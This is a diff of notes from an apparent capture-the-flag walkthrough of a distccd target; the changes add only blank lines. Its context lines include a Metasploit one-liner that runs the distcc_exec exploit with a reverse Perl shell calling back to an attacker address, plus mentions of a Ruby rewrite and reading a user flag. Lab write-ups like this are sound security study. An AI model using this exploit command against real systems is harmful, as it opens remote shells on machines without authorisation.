@@ -15,6 +15,8 @@ msf5 > search distccd
 
 $ msfconsole -x "use exploit/unix/misc/distcc_exec; set payload cmd/unix/reverse_perl;set RHOST 10.10.10.3;set LHOST 10.10.14.4;exploit"
 
+
+
 # Rewrite Exploit 
 ruby exploit_distcc.rb 
 
@@ -228,6 +230,7 @@ cat /home/makis/user.txt
 # Rewrite the exploit with msf in one line
 
 $ msfconsole -x "use exploit/unix/misc/distcc_exec; set payload cmd/unix/reverse_perl;set RHOST 10.10.10.3;set LHOST 10.10.14.4;exploit"
+
 
 # Rewrite the exploit in ruby : exploit_distcc.rb 
 
